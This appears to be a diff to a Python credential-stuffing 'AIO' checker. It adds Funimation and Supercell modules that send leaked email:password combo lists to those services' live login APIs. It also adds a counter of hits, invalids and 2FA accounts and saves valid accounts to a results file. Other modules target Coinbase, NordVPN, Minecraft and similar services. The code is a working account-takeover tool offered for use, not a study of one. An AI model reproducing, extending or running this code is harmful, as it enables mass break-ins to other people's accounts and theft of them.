@@ -1,5 +1,6 @@
 import os
-from os import system
+from os import system, name
+
 import json
 try:
   import requests
@@ -27,9 +28,83 @@ except:
   print('Download the Config in https://raw.githubusercontent.com/bearbearteam/python-aio/main/config.json ! ')
   time.sleep(5)
   exit()
+def clear():
+  
+    # for windows
+    if name == 'nt':
+        _ = system('cls')
+  
+    # for mac and linux(here, os.name is 'posix')
+    else:
+        _ = system('clear')
 def save():
   with open('config.json', 'w+') as f:
     json.dump(config, f)
+class counter:
+  invalid = 0
+  hits = 0
+  free = 0
+  free2fa = 0
+def loadcounter():
+  hits = str(counter.hits)
+  invalid = str(counter.invalid)
+  free = str(counter.free)
+  free2fa = str(counter.free2fa)
+  clear()
+  print('          Aio Status')
+  print('          Hits : '+hits)
+  print('          Invalids : '+invalid)
+  print('          Free : '+free)
+  print('          2fa : '+free2fa)
+clear()
+
+
+
+def Funimation(combo,proxy):
+  
+  x,y = combo.split(":", 1)
+  headers = requests.utils.default_headers()
+  headers.update(
+      {
+          'User-Agent': 'okhttp/3.12.1',
+          
+      }
+  )
+  url = 'https://prod-api-funimationnow.dadcdigital.com/api/auth/login/'
+  data ={"email":x,"password":y}
+
+  r = requests.post(url, json=data,headers=headers)
+  if 'Failed Authentication' or 'false' in r.text:
+    status = 'false'
+  elif 'token' in r.text:
+    status = 'true'
+  elif r.status_code ==429:
+    status = 'false'
+
+  return status
+def supercell(combo,proxy):
+  
+  x,y = combo.split(":", 1)
+  headers = requests.utils.default_headers()
+  headers.update(
+      {
+          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
+          
+      }
+  )
+  url = 'https://mvfldg522i.execute-api.us-east-1.amazonaws.com/production/customers/login'
+  data ={"email":x}
+
+  r = requests.post(url, json=data,headers=headers)
+  if 'Bad request' in r.text:
+    status = 'false'
+  elif '{}' in r.text:
+    status = 'true'
+  elif r.status_code ==429:
+    status = 'false'
+  else :
+    status = 'false'
+  return status
 def minecraft(combo,proxy):
   
   x,y = combo.split(":", 1)
@@ -204,7 +279,7 @@ def proxy_loader(proxyfile):
   return proxies
 
 def combo_loader():
-  print('\nModules:\n1 : GeoGussr\n2 : Curiosity Stream\n3 : NordVPN\n4 : Picstart\n5 : Coinbase\n6 : malwarebytes\n7 : Adobe VM\n8 : Minecraft\nS : Settings')
+  print('\nModules:\n1 : GeoGussr\n2 : Curiosity Stream\n3 : NordVPN\n4 : Picstart\n5 : Coinbase\n6 : malwarebytes\n7 : Adobe VM\n8 : Minecraft\n9 : SuperCell VM\n10 : Funimation\nS : Settings')
   module = input('Please input module number : ')
 
   if module == 'S':
@@ -250,13 +325,20 @@ def combo_loader():
       output = adobevm(x,proxyoutput)
     elif module == '8':
       output = minecraft(x,proxyoutput)
+    elif module == '9':
+      output = supercell(x,proxyoutput)
+    elif module == '10':
+      output = Funimation(x,proxyoutput)
     else:
       print('Bruh,Chose a Valid module')
       time.sleep(10)
       quit()
     if output == 'true' :
+      counter.hits +=1
       if log == "1":
         print('valid : '+ x ) 
+      else:
+        loadcounter()
       isdir = os.path.isdir('results')
       if isdir == False :
         os.mkdir('results')
@@ -264,8 +346,12 @@ def combo_loader():
       accountwrite = (x+'\n')
       f.write(accountwrite)
     elif output == '2fa':
+      counter.free2fa +=1
+
       if log == "1":
         print('2fa : '+ x ) 
+      else:
+        loadcounter()
       isdir = os.path.isdir('results')
       if isdir == False :
         os.mkdir('results')
@@ -273,7 +359,12 @@ def combo_loader():
       accountwrite = (x+'\n')
       f.write(accountwrite)
     elif output == 'false':
-      print('Invalid : ' + x)
+      counter.invalid +=1
+      if log == "1":
+        print('invalid : '+ x )
+      else:
+        loadcounter()
+        
     else:
       print(output)
   return file
